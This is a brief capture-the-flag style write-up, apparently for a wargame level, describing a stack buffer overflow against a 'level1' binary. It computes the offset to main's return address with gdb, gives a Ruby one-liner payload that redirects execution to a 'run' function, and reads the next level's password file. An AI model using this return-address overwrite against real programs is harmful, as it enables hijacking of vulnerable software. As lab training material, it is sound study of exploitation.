- we need to execute run function
- we can override main return address with run address
- using gdb we find run address @ 0x08048444

- size of str is 64 bytes
- next we can have between 0 and 15 bytes of stack alignment
- then 4 bytes for saved ebp
- finaly we found the main return address

- so we must fill str with a number of random bytes between 68 and 68 + 15
and add run address to it
- gdb can give us a clue and shows a difference of 8 bytes between ebp and esp
	- (ruby -e 'print "x" * (68 + 8) + "\x44\x84\x04\x08"'; cat) | ./level1
- if we don't see "Good... Wait what" after pressing a key we have to try another
offset between 0 and 15
- finally
	- cat /home/user/level2/.pass
